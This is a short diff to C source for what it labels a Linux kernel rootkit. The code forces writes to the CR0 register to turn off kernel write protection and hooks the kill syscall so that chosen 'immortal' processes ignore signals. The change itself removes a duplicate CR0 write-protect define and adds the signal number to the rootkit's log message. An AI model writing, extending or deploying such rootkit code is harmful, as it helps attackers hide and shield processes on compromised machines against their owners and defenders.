@@ -99,8 +99,6 @@ static inline void write_cr0_forced(unsigned long val) {
     asm volatile("mov %0, %%cr0": "+r"(val), "+m"(__force_order));
 }
 
-#define X86_CR0_WP 0x10000
-
 static inline void enable_write_protection(void) {
     preempt_enable();
     write_cr0_forced(read_cr0() | X86_CR0_WP);
@@ -632,7 +630,7 @@ static asmlinkage long hook_kill(const struct pt_regs *regs) {
     int sig = regs->si;
 
     if (sig < SIGTOGF && is_immortal(pid)) {
-        printk(KERN_INFO "rootkit: immortal process: pid = %d cannot be killed\n", pid);
+        printk(KERN_INFO "rootkit: immortal process: pid = %d cannot be killed with signal %d\n", pid, sig);
         return 0;
     }
 
